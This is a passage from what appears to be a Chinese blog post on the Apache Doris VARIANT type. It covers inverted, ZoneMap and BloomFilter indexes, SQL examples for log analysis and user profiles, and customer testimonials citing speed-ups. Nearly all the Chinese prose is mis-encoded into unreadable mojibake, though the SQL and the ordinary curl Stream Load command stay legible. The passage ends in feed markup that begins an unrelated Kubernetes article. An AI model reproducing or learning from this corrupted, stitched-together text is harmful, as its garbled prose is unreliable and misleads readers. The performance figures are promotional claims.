<p>Doris Variant çš„ç´¢å¼•ä½“ç³»ï¼Œç›®æ ‡æ˜¯åœ¨ ç»“æ„åŒ–è¿‡æ»¤ ä¸ å…¨æ–‡æ£€ç´¢ ä¹‹é—´å–å¾—å¹³è¡¡ã€‚å®ƒæ—¢èƒ½åƒåˆ—å­˜ä¸€æ ·é«˜æ•ˆå‘½ä¸­ç»“æ„åŒ–å­—æ®µï¼Œåˆèƒ½åƒæœç´¢å¼•æ“ä¸€æ ·æ”¯æŒå…³é”®è¯åŒ¹é…ä¸çŸ­è¯­æ£€ç´¢ã€‚ä¸ºå®ç°è¿™ä¸€ç›®æ ‡ï¼Œ<strong>Doris åœ¨å­˜å‚¨å±‚é›†æˆå€’æ’ç´¢å¼•ï¼Œå¹¶ä¸ ZoneMapã€BloomFilterã€å»¶è¿Ÿç‰©åŒ– ç­‰åŸç”Ÿç´¢å¼•ååŒå·¥ä½œï¼Œå®ç°ä»æ–‡ä»¶çº§åˆ°è¡Œçº§çš„å¤šå±‚å‰ªæä¸å¿«é€Ÿå®šä½</strong>ã€‚ä¸‹é¢ä»å‡ ä¸ªå…³é”®æœºåˆ¶æ¥çœ‹å®ƒçš„å®ç°æ–¹å¼ï¼š</p>
<h3 data-id="heading-7">2.1 å€’æ’ç´¢å¼•çš„æ— ç¼é›†æˆ</h3>
<ul>
<li>åŸç†ï¼š <code>VARIANT</code> å…è®¸ç”¨æˆ·ä¸ºä»»æ„å­åˆ—åˆ›å»ºå€’æ’ç´¢å¼•ã€‚ä¾‹å¦‚ï¼Œ<code>CREATE INDEX idx ON tbl(v) USING INVERTED PROPERTIES("parser" = "english")</code>ã€‚Doris åœ¨æ•°æ®å†™å…¥æ—¶ï¼Œè‡ªåŠ¨æå– <code>v</code> å­åˆ—çš„å€¼ï¼Œå¹¶åˆ†è¯ï¼ˆå¦‚æœéœ€è¦ï¼‰æˆ–æŒ‰åŸå§‹å€¼å»ºç«‹ä¸€ä¸ªä»â€œè¯ï¼ˆTermï¼‰â€åˆ°â€œè¡Œå·ï¼ˆRowIDï¼‰â€çš„æ˜ å°„è¡¨ã€‚</li>
<li>æŸ¥è¯¢ï¼š å½“æŸ¥è¯¢æ¡ä»¶ä¸º <code>WHERE v['message'] MATCH_ANY 'error'</code> æˆ– <code>v['level'] = 'FATAL'</code> æ—¶ï¼ŒæŸ¥è¯¢å¼•æ“ä¸éœ€æ‰«æå…¨è¡¨æ•°æ®ã€‚å¯ç›´æ¥åˆ©ç”¨å€’æ’ç´¢å¼•ï¼Œå¿«é€Ÿå®šä½åŒ…å«å…³é”®è¯ <code>error</code> æˆ– <code>FATAL</code> çš„æ‰€æœ‰è¡Œï¼ŒæŸ¥è¯¢å¤æ‚åº¦ä» O(N) é™è‡³ O(logN) ç”šè‡³ O(1ï¼‰ã€‚</li>
</ul>
<h3 data-id="heading-8">2.2 å†…ç½®ç´¢å¼•çš„ååŒ</h3>
<p>ç”±äºé«˜é¢‘å­åˆ—å·²è¢«ç‰©åŒ–ä¸ºå†…éƒ¨å­åˆ—ï¼Œå®ƒä»¬è‡ªç„¶äº«å—åˆ° Doris çš„å…¶ä»–ç´¢å¼•ç±»å‹çš„åŠ æˆï¼š</p>
<ul>
<li>ZoneMap ç´¢å¼•ï¼š é»˜è®¤å¼€å¯ï¼Œè®°å½•æ¯ä¸ªæ•°æ®å—ï¼ˆPageï¼‰å†…å­åˆ—æœ€å¤§/æœ€å°å€¼ã€‚å¯¹äº <code>WHERE v['properties']['price'] &gt; 1000</code> è¿™æ ·çš„èŒƒå›´æŸ¥è¯¢ï¼Œå¯å¿«é€Ÿè·³è¿‡ä¸æ»¡è¶³æ¡ä»¶çš„æ•°æ®å—ï¼Œç”šè‡³è·³è¿‡æ–‡ä»¶ã€‚</li>
<li>BloomFilter ç´¢å¼•ï¼š å¯¹äºé«˜åŸºæ•°çš„å­åˆ—ï¼ˆå¦‚ <code>user_id</code>ï¼‰ï¼Œå¯åˆ›å»ºå¸ƒéš†è¿‡æ»¤å™¨ç´¢å¼•ï¼Œå¿«é€Ÿåˆ¤æ–­æŸä¸ªå€¼æ˜¯å¦å­˜åœ¨ï¼Œè¿‡æ»¤æ‰å¤§é‡æ— å…³è¯»å–è¯·æ±‚ã€‚</li>
<li>å»¶è¿Ÿç‰©åŒ–é…åˆç´¢å¼•ï¼š å…ˆç”¨ ZoneMap/BBloomFilter å€’æ’åœ¨æ–‡ä»¶/é¡µ/è¡Œçº§å®Œæˆå‰ªæä¸å®šä½ï¼Œå†å¯¹æŸ¥è¯¢å‘½ä¸­çš„è¡ŒæŒ‰éœ€è§£ç éè°“è¯æŠ•å½±çš„å­åˆ—ï¼Œé¿å…å¯¹æœªæŠ•å½±æˆ–è¢«è¿‡æ»¤æ‰çš„å­åˆ—åšæ— è°“è§£ç ï¼Œå¯æœ‰æ•ˆé™ä½ CPU ä¸ I/O æˆæœ¬ã€‚</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1ec7f7b87521467a8959eb8f14e71b6d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2VsZWN0REI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764586180&amp;x-signature=zOy%2BaUDq73kI8CF6rGW6wmtUZlU%3D" alt="2.2 å†…ç½®ç´¢å¼•çš„ååŒ.png" loading="lazy"/></p>
<h3 data-id="heading-9">2.3 Schema Template ä¸ Path çº§ç´¢å¼•</h3>
<p>Schema Template å’Œ Path çº§ç´¢å¼• æ˜¯å®ç°ç²¾ç¡®ç´¢å¼•ä¸‹æ¨çš„å…³é”®æœºåˆ¶ã€‚å‰è€…å®šä¹‰ã€Œå“ªäº› JSON å­åˆ—éœ€è¢«å•ç‹¬è¯†åˆ«ä¸ä¼˜åŒ–ã€ï¼Œåè€…å®šä¹‰ã€Œè¿™äº›å­åˆ—å¦‚ä½•è¢«ç´¢å¼•ä¸å‘½ä¸­ã€ã€‚</p>
<p>é€šè¿‡ Schema Templateï¼Œå¯ä»¥ä¸ºå…³é”®å­åˆ—é¢„å£°æ˜ç±»å‹åŠç´¢å¼•å±æ€§ï¼Œè®©ç³»ç»Ÿåœ¨è¯»å†™é˜¶æ®µå°±èƒ½è¯†åˆ«è¿™äº›é«˜ä»·å€¼è·¯å¾„ã€‚ Path çº§ç´¢å¼•åˆ™åœ¨æ­¤åŸºç¡€ä¸Šç»‘å®šå€’æ’ã€Bloom æˆ– ZoneMap ç­‰å¤šå±‚ç´¢å¼•ç­–ç•¥ï¼Œå®ç°ç»“æ„æ„ŸçŸ¥çš„æŸ¥è¯¢ä¼˜åŒ–ã€‚</p>
<p>å…¸å‹é…ç½®ï¼š</p>
<pre><code class="hljs language-SQL" lang="SQL"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> IF <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">EXISTS</span> tbl (
    k <span class="hljs-type">BIGINT</span>,
    v VARIANT<span class="hljs-operator">&lt;</span><span class="hljs-string">'content'</span> : STRING<span class="hljs-operator">&gt;</span>,
    INDEX idx_tokenized(v) <span class="hljs-keyword">USING</span> INVERTED PROPERTIES(
        "parser" <span class="hljs-operator">=</span> "english",
        "field_pattern" <span class="hljs-operator">=</span> "content",
        "support_phrase" <span class="hljs-operator">=</span> "true"
    ),
    INDEX idx_keyword(v) <span class="hljs-keyword">USING</span> INVERTED PROPERTIES(
        "field_pattern" <span class="hljs-operator">=</span> "content"
    )
);

<span class="hljs-comment">-- tokenized for MATCH; keyword for exact equality</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> tbl <span class="hljs-keyword">WHERE</span> v[<span class="hljs-string">'content'</span>] <span class="hljs-keyword">MATCH</span> <span class="hljs-string">'Doris'</span>;
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> tbl <span class="hljs-keyword">WHERE</span> v[<span class="hljs-string">'content'</span>] <span class="hljs-operator">=</span> <span class="hljs-string">'Doris'</span>;
</code></pre>
<blockquote>
<p>tokenized ç”¨äº <code>MATCH</code> æœç´¢ï¼›keyword ç”¨äºç²¾ç¡®åŒ¹é…ã€‚</p>
</blockquote>
<p>é€šé…ç¬¦ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-SQL" lang="SQL">INDEX idx_logs(v) <span class="hljs-keyword">USING</span> INVERTED PROPERTIES(
  "field_pattern" <span class="hljs-operator">=</span> "logs.*"
);
</code></pre>
<p>æ›´å¤šä½¿ç”¨æ–¹å¼è¯·å‚è€ƒï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fdoris.apache.org%2Fzh-CN%2Fdocs%2F3.x%2Fsql-manual%2Fbasic-element%2Fsql-data-types%2Fsemi-structured%2FVARIANT" target="_blank" title="https://doris.apache.org/zh-CN/docs/3.x/sql-manual/basic-element/sql-data-types/semi-structured/VARIANT" ref="nofollow noopener noreferrer">Variant æ–‡æ¡£</a></p>
<h2 data-id="heading-10">ä¸‰ã€å…¸å‹åœºæ™¯å®æˆ˜æŒ‡å—</h2>
<h3 data-id="heading-11">3.1  æ—¥å¿—åˆ†æåœºæ™¯</h3>
<p>åŸºäº Elasticsearch æˆ– ClickHouse çš„æ—¥å¿—åˆ†æå¹³å°æ˜¯è¾ƒä¸ºå¸¸è§çš„æ–¹æ¡ˆï¼Œä½†å…¶é—®é¢˜ä¹Ÿæ¯”è¾ƒæ˜æ˜¾ï¼šå†™å…¥æˆæœ¬é«˜ã€å­—æ®µå˜åŒ–éš¾ä»¥ç®¡ç†ä»¥åŠæŸ¥è¯¢ååä¸ç¨³å®šç­‰ã€‚</p>
<p>è€Œå¦‚æœä½¿ç”¨ Doris ï¼ŒVariant ç±»å‹å¯ç›´æ¥å†™å…¥åŸå§‹ JSON æ—¥å¿—ï¼Œä¸å†éœ€è¦å¤æ‚çš„ ETL æˆ– Schema Flattenï¼Œæ— éœ€å¤æ‚çš„é¢„å¤„ç†å’Œ Schema å®šä¹‰ï¼Œå³å¯å¯¹ä»»æ„æ—¥å¿—å­—æ®µè¿›è¡Œé«˜æ€§èƒ½çš„è¿‡æ»¤å’Œå…¨æ–‡æ£€ç´¢ã€‚</p>
<p>ç¤ºä¾‹å»ºè¡¨ï¼š</p>
<pre><code class="hljs language-SQL" lang="SQL"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> access_log (
  dt <span class="hljs-type">DATE</span>,
  log JSON
)
DUPLICATE KEY(dt)
DISTRIBUTED <span class="hljs-keyword">BY</span> HASH(dt)
PROPERTIES ("replication_num" <span class="hljs-operator">=</span> "1");

<span class="hljs-keyword">CREATE</span> INDEX idx_log <span class="hljs-keyword">ON</span> access_log(log) <span class="hljs-keyword">USING</span> INVERTED;
</code></pre>
<p>æ—¥å¿—é€šè¿‡ Stream Load å®æ—¶å†™å…¥ï¼š</p>
<pre><code class="hljs language-SQL" lang="SQL">curl <span class="hljs-operator">-</span>u <span class="hljs-keyword">user</span>:password \
  <span class="hljs-operator">-</span>T access.json \
  <span class="hljs-operator">-</span>H "format: json" \
  http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>fe_host:<span class="hljs-number">8030</span><span class="hljs-operator">/</span>api<span class="hljs-operator">/</span>db<span class="hljs-operator">/</span>access_log<span class="hljs-operator">/</span>_stream_load
</code></pre>
<p>éšåå°±å¯ä»¥åƒæ“ä½œç»“æ„åŒ–æ•°æ®ä¸€æ ·æ‰§è¡ŒæŸ¥è¯¢ï¼š</p>
<pre><code class="hljs language-SQL" lang="SQL"><span class="hljs-keyword">SELECT</span>
  log[<span class="hljs-string">'status'</span>] <span class="hljs-keyword">AS</span> status,<span class="hljs-built_in">COUNT</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">AS</span> cnt
<span class="hljs-keyword">FROM</span> access_log
<span class="hljs-keyword">WHERE</span> log[<span class="hljs-string">'region'</span>] <span class="hljs-operator">=</span> <span class="hljs-string">'US'</span>
<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> status;
</code></pre>
<p>åœ¨è¿™ä¸ªåœºæ™¯ä¸­ï¼ŒDoris ä¼šè‡ªåŠ¨å°† key åˆ—åŒ–å­˜å‚¨ï¼Œä¾‹å¦‚ <code>region</code> å’Œ <code>status</code>ï¼Œä»è€Œå®ç°<strong>äºšç§’çº§èšåˆæ€§èƒ½</strong>ã€‚åŒæ—¶æ—¥å¿—ç»“æ„è‹¥æœ‰æ–°å¢å­—æ®µï¼ˆä¾‹å¦‚ <code>latency</code> æˆ– <code>trace_id</code>ï¼‰ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨åˆ›å»ºåˆ—å­˜å¹¶å†™å…¥ç´¢å¼•ï¼Œæ— éœ€æ‰‹åŠ¨ ALTER TABLE æˆ–é‡æ–°å¯¼å…¥ã€‚</p>
<p><strong>å®æµ‹è¡¨æ˜ï¼Œåœ¨åŒç­‰ç¡¬ä»¶æ¡ä»¶ä¸‹ï¼ŒDoris çš„æ—¥å¿—èšåˆæŸ¥è¯¢æ€§èƒ½ç›¸æ¯” Elasticsearch å¿« 2â€“3 å€ï¼Œå†™å…¥å»¶è¿Ÿé™ä½ 80% ä»¥ä¸Šï¼Œå‡å°‘çº¦ 70â€“80% å­˜å‚¨ç©ºé—´ã€‚</strong></p>
<h3 data-id="heading-12">3.2 åŠ¨æ€ç”¨æˆ·ç”»åƒ</h3>
<p>åœ¨ç”¨æˆ·ç”»åƒç³»ç»Ÿä¸­ï¼Œæ¯ä¸ªç”¨æˆ·é€šå¸¸æ‹¥æœ‰æˆç™¾ä¸Šåƒä¸ªæ ‡ç­¾ï¼Œå¦‚åœ°åŸŸã€å…´è¶£ã€åå¥½ã€æ´»è·ƒåº¦å’Œæ¸ é“æ¥æºç­‰ã€‚è¿™äº›æ ‡ç­¾å¾€å¾€éœ€è¦é¢‘ç¹æ–°å¢æˆ–å˜æ›´ã€‚ä¼ ç»Ÿçš„åˆ—å¼å»ºæ¨¡æ–¹æ¡ˆæ„å‘³ç€éœ€è¦ä¸æ–­ä¿®æ”¹è¡¨ç»“æ„æˆ–ç»´æŠ¤ä¸Šç™¾ä¸ªå®½è¡¨ï¼Œè¿™ç§åšæ³•æ•ˆç‡æä½ã€‚è€Œ Doris çš„ VARIANT åªéœ€ä¸€ä¸ª Profile åˆ—å³å¯å®¹çº³æ‰€æœ‰æ ‡ç­¾ä¿¡æ¯ã€‚</p>
<p><strong>ç¤ºä¾‹å»ºè¡¨ï¼š</strong></p>
<pre><code class="hljs language-SQL" lang="SQL"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> user_profile (
  user_id <span class="hljs-type">BIGINT</span>,
  profile VARIANT
)
DUPLICATE KEY(user_id)
DISTRIBUTED <span class="hljs-keyword">BY</span> HASH(user_id);
</code></pre>
<p>å†™å…¥æ—¶ç›´æ¥æ’å…¥ JSON ç»“æ„ï¼š</p>
<pre><code class="hljs language-JSON" lang="JSON">INSERT INTO user_profile VALUES
(<span class="hljs-number">1001</span><span class="hljs-punctuation">,</span> '<span class="hljs-punctuation">{</span><span class="hljs-attr">"region"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"US"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"age"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">28</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"interest"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"movie"</span><span class="hljs-punctuation">,</span><span class="hljs-string">"sports"</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">}</span>')<span class="hljs-punctuation">,</span>
(<span class="hljs-number">1002</span><span class="hljs-punctuation">,</span> '<span class="hljs-punctuation">{</span><span class="hljs-attr">"region"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"CA"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"vip"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"device"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ios"</span><span class="hljs-punctuation">}</span>');
</code></pre>
<p>æŸ¥è¯¢æ—¶æ— éœ€å±•å¼€ï¼Œä¹Ÿèƒ½é«˜æ•ˆèšåˆï¼š</p>
<pre><code class="hljs language-SQL" lang="SQL"><span class="hljs-keyword">SELECT</span>
  <span class="hljs-built_in">CAST</span>(profile[<span class="hljs-string">'region'</span>] <span class="hljs-keyword">AS</span> String) <span class="hljs-keyword">AS</span> region,<span class="hljs-built_in">COUNT</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">AS</span> cnt
<span class="hljs-keyword">FROM</span> user_profile
<span class="hljs-keyword">WHERE</span> profile[<span class="hljs-string">'vip'</span>] <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>
<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> region;
</code></pre>
<p>åœ¨åå°ï¼ŒDoris ä¼šè‡ªåŠ¨è¯†åˆ«å‡ºç°çš„ key ï¼ˆå¦‚ <code>region</code> ã€<code>vip</code> ï¼‰ï¼Œå¹¶å°†å…¶ç‰©åŒ–ä¸ºç‹¬ç«‹åˆ—ï¼ˆæ”¯æŒæˆåƒä¸Šä¸‡çš„ç‹¬ç«‹åˆ—ï¼‰ã€‚æå…¶ä½é¢‘å­—æ®µä»ä¿ç•™åœ¨å…œåº• <code>Sparse</code> åˆ—ä¸­ã€‚ å› æ­¤å³ä¾¿æ ‡ç­¾æ•°é‡å¢é•¿åˆ°ä¸Šåƒä¸ªï¼ŒæŸ¥è¯¢æ€§èƒ½ä¾ç„¶æ¥è¿‘æ™®é€šç»“æ„åŒ–è¡¨ã€‚</p>
<p><strong>å®é™…ç”¨æˆ·æµ‹è¯•ä¸­ï¼Œæ‹¥æœ‰ 7000 ä¸ªåŠ¨æ€æ ‡ç­¾çš„ç”¨æˆ·ç”»åƒè¡¨ï¼ŒæŸ¥è¯¢ Top10 æ ‡ç­¾åˆ†å¸ƒçš„å¹³å‡å“åº”æ—¶é—´ä¿æŒåœ¨ 1 ç§’ä»¥å†…ã€‚</strong></p>
<h3 data-id="heading-13">3.3 å®¢æˆ·ä½¿ç”¨åé¦ˆ</h3>
<p>åº¦å°æ»¡å®ç°ä» Greenplum åˆ°  Apache Doris çš„å¹³æ»‘è¿ç§»ï¼Œæ„å»ºäº†è¶…å¤§è§„æ¨¡æ•°æ®åˆ†æå¹³å°ã€‚å€ŸåŠ©å†…ç½®çš„ Variant ç±»å‹ï¼Œå®ç°äº†å¯¹ 2â€“3 ä¸‡  JSON Key çš„é«˜æ•ˆæŸ¥è¯¢ä¸å­˜å‚¨ï¼ˆPB çº§åˆ«ï¼‰ã€‚<strong>ç³»ç»Ÿæ•´ä½“æ€§èƒ½æå‡ 20â€“30 å€ï¼ŒJSON æŸ¥è¯¢é€Ÿåº¦æå‡ 10 å€ï¼Œå­˜å‚¨å ç”¨ä¸ºä¼ ç»Ÿ JSON ç±»å‹çš„ 1/10</strong>ã€‚åœ¨é«˜å¹¶å‘å®æ—¶æŸ¥è¯¢ä¸å¤æ‚åˆ†æä»»åŠ¡ä¸‹ï¼ŒæˆåŠŸæ”¯æ’‘ é‡‘èçº§æŒ‡æ ‡åˆ†æä¸å®æ—¶æ•°æ®æœåŠ¡ï¼Œè®©åº¦å°æ»¡çš„æ•°æ®å¹³å°å®ç°ä» ç¦»çº¿åˆ†æ â†’ å®æ—¶æ´å¯Ÿçš„è·¨è¶Šã€‚</p>
<p>â€”â€”åº¦å°æ»¡</p>
<p>æŸå¤§å‹äº’è”ç½‘å…¬å¸å°†åŸæœ‰ HBase + Elasticsearch + Snowflake ä¸‰å¥—ç³»ç»Ÿè¿ç§»è‡³ Doris è¿™ä¸€å¥—ç³»ç»Ÿä¸­æ¥ï¼Œå®ç°äº†æœç´¢ä¸åˆ†æç»Ÿä¸€ã€‚<strong>Doris Variant åˆ—å¼æ•°æ®ç±»å‹æ”¯æŒé«˜ç»´ã€åŠ¨æ€ JSON çš„é«˜æ•ˆå­˜å‚¨ä¸æŸ¥è¯¢ï¼Œè®©æ•°åäº¿å¯¹è±¡çš„éç»“æ„åŒ–å±æ€§ä¹Ÿèƒ½ä»¥åˆ—å¼æ–¹å¼å¤„ç†</strong>ã€‚å¹¶åŸºäºå­åˆ—ç´¢å¼•ä¸è£å‰ªæœºåˆ¶ï¼Œ<strong>æŸ¥è¯¢å»¶è¿Ÿä»ç§’çº§é™è‡³ç™¾æ¯«ç§’çº§</strong>ï¼Œå¹¶å‘å†™å…¥ä¸å¤æ‚ Join æ€§èƒ½ä¹Ÿæ˜¾è‘—æå‡ã€‚ç³»ç»Ÿæ•´ä½“æˆæœ¬é™ä½ï¼Œæ¶æ„å¾—åˆ°ç®€åŒ–ï¼Œç¨³å®šæ€§ä¸ä¸€è‡´æ€§å…¨é¢å¢å¼ºã€‚</p>
<p>â€”â€”æŸå¤§å‹äº’è”ç½‘å…¬å¸</p>
<p>åœ¨åŸç³»ç»Ÿä¸­ï¼ˆElasticsearchï¼‰ï¼ŒDynamic Mapping å¯¼è‡´å­—æ®µå†²çªé¢‘å‘ã€èµ„æºå ç”¨é«˜ã€èšåˆæ€§èƒ½å—é™ã€‚è§‚æµ‹äº‘æºæ‰‹é£è½®ç§‘æŠ€ï¼ŒåŸºäº Doris å¼•å…¥ Variant æ•°æ®ç±»å‹ä¸å€’æ’ç´¢å¼•ï¼Œå¹¶é€šè¿‡ S3 å¯¹è±¡å­˜å‚¨ æ„å»ºå¼¹æ€§å†·çƒ­åˆ†ç¦»æ¶æ„ï¼Œå¤§å¹…æå‡æ—¥å¿—ä¸è¡Œä¸ºæ•°æ®çš„æŸ¥è¯¢æ•ˆç‡ã€‚å‡çº§åï¼Œ<strong>æœºå™¨æˆæœ¬é™ä½ 70%ï¼Œæ•´ä½“æŸ¥è¯¢æ€§èƒ½æå‡ 2 å€ï¼Œç®€å•æŸ¥è¯¢æé€Ÿè¶… 4 å€ï¼Œä»¥ä¸åˆ° 1/3 çš„æˆæœ¬è·å¾—æ•°å€æ€§èƒ½æå‡</strong>ï¼Œæ˜¾è‘—å¢å¼ºäº†å¯è§‚æµ‹æ€§å¹³å°çš„å¯æ‰©å±•æ€§ä¸ç»æµæ€§ã€‚</p>
<p>â€”â€”è§‚æµ‹äº‘</p>
<p>æŸå…¨çƒé¢†å…ˆçš„æ–°èƒ½æºä¸æ™ºèƒ½åˆ¶é€ ä¼ä¸šå°†åŸæœ‰ Hive/Kudu + Impala/Presto ä½“ç³»è¿ç§»åˆ° Apache Dorisï¼Œæ„å»ºäº†é¢å‘è½¦è”ç½‘ä¸è£…å¤‡å…¨ç”Ÿå‘½å‘¨æœŸçš„å®æ—¶åˆ†æå¹³å°ã€‚<strong>ä¾æ‰˜ Doris å†…ç½®çš„ Variant ç±»å‹ï¼Œé«˜æ•ˆå¤„ç† PB çº§è§„æ¨¡çš„ JSON åŠç»“æ„åŒ–æ•°æ®ï¼Œå®ç°ç§’çº§å®æ—¶æ‘„å–å’Œæ¯«ç§’çº§æŸ¥è¯¢æ€§èƒ½ã€‚</strong> åœ¨æ ¸å¿ƒä¸šåŠ¡å¦‚å®æ—¶çœ‹æ¿ã€å…¨é“¾è·¯è¿½è¸ªã€è®¾å¤‡è¿è¡Œä¸å¥åº·åˆ†æç­‰åœºæ™¯ä¸­ï¼Œ<strong>å¤æ‚ JSON æŸ¥è¯¢æé€Ÿ 3â€“10 å€ã€é«˜å¹¶å‘æŸ¥è¯¢èƒ½åŠ›æ˜¾è‘—æå‡ã€ä¸”å­˜å‚¨å ç”¨ä»…ä¸ºä¼ ç»Ÿæ–¹æ¡ˆçš„ 1/3</strong>ã€‚å€ŸåŠ©ç»Ÿä¸€çš„ Doris å¼•æ“ï¼Œå®ç°ä»ç¦»çº¿æ‰¹å¤„ç†åˆ°å®æ—¶æ´å¯Ÿçš„è·¨è¶Šï¼Œå¤§å¹…é™ä½æ•´ä½“æ¶æ„å¤æ‚åº¦ä¸è¿ç»´æˆæœ¬ã€‚</p>
<p>â€”â€”æŸå…¨çƒé¢†å…ˆçš„æ–°èƒ½æºä¸æ™ºèƒ½åˆ¶é€ ä¼ä¸š</p>
<p>é¢å¯¹ä¸Šç™¾ä¸‡è¾†è½¦æ—¥å‡æ•°å TB ä¿¡å·æ•°æ®çš„æŒ‘æˆ˜ï¼Œé›¶è·‘é‡‡ç”¨ <strong>Variant åŠ¨æ€åˆ—å­˜</strong> ä¸ <strong>S3 å¯¹è±¡å­˜å‚¨</strong> æ„å»ºç»Ÿä¸€æ•°æ®åº•åº§ï¼Œæ”¯æŒäº†æ™ºèƒ½åº§èˆ±ã€è¿œç¨‹è¯Šæ–­å’Œç”¨æˆ·è¡Œä¸ºåˆ†æç­‰å¤šåœºæ™¯ã€‚ç»“åˆç‰©åŒ–è§†å›¾ä¸å¼¹æ€§è®¡ç®—ï¼Œå®ç°æ¯«ç§’çº§æŸ¥è¯¢ä¸è‡ªåŠ¨ä¼¸ç¼©ã€å­˜å‚¨æˆæœ¬ä¸‹é™ 60% çš„æ˜¾è‘—æˆæ•ˆã€‚å›¢é˜Ÿæ­£è¿›ä¸€æ­¥éªŒè¯ <strong>Serverless å½¢æ€</strong>ï¼Œå¸Œæœ›åˆ©ç”¨ S3 çš„é«˜å¼¹æ€§ä¸ Doris çš„é«˜æ€§èƒ½ï¼Œå®ç°â€œæŒ‰éœ€ä½¿ç”¨ã€é›¶è¿ç»´ä¼¸ç¼©â€çš„æ•°æ®äº‘è„‘ã€‚</p>
<p>â€”â€” é›¶è·‘æ±½è½¦</p>
<h2 data-id="heading-14">å››ã€ç»“æŸè¯­</h2>
<p>Apache Doris çš„ <code>VARIANT</code> ç±»å‹ï¼Œè®©åŠç»“æ„åŒ–æ•°æ®èƒ½åœ¨åˆ—å¼å¼•æ“ä¸­è¢«è‡ªç„¶åœ°å¤„ç†ã€‚å®ƒé€šè¿‡åŠ¨æ€å­åˆ—ã€ç¨€ç–åˆ—å­˜å‚¨ã€å»¶è¿Ÿç‰©åŒ–å’Œè·¯å¾„ç´¢å¼•ï¼Œå°† JSON è§£æã€åˆ—è£å‰ªä¸ç´¢å¼•ä¸‹æ¨æ•´åˆä¸ºç»Ÿä¸€ä½“ç³»ï¼Œå®ç°äº†<strong>çµæ´»ç»“æ„ ä¸ åˆ—å­˜æ€§èƒ½</strong>çš„å¹³è¡¡ã€‚</p>
<p>æœªæ¥ï¼ŒApache Doris å°†è¿›ä¸€æ­¥å¢å¼º Variant è‡ªåŠ¨ Schema æ¨å¯¼èƒ½åŠ›ï¼Œæ”¯æŒæ›´ä¸°å¯Œçš„ç±»å‹ã€æ›´å¼ºå¤§çš„å­åˆ—ç´¢å¼•ç³»ç»Ÿï¼Œå¹¶ä¼˜åŒ–ç¨€ç–åˆ—çš„æ•°æ®æŸ¥è¯¢ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Kubernetes CRD æ–¹å¼é…ç½®å®¹å™¨æ—¥å¿—é‡‡é›†æœ€ä½³å®è·µ]]></title>    <link>https://juejin.cn/post/7576175307356323875</link>    <guid>https://juejin.cn/post/7576175307356323875</guid>    <pubDate>2025-11-24T11:01:05.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576175307356323875" data-draft-id="7575910298283737123" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Kubernetes CRD æ–¹å¼é…ç½®å®¹å™¨æ—¥å¿—é‡‡é›†æœ€ä½³å®è·µ"/> <meta itemprop="keywords" content="Kubernetes"/> <meta itemprop="datePublished" content="2025-11-24T11:01:05.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¯è§‚æµ‹æ€§ç”¨è§‚æµ‹äº‘"/> <meta itemprop="url" content="https://juejin.cn/user/2392958212523102"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Kubernetes CRD æ–¹å¼é…ç½®å®¹å™¨æ—¥å¿—é‡‡é›†æœ€ä½³å®è·µ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2392958212523102/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¯è§‚æµ‹æ€§ç”¨è§‚æµ‹äº‘
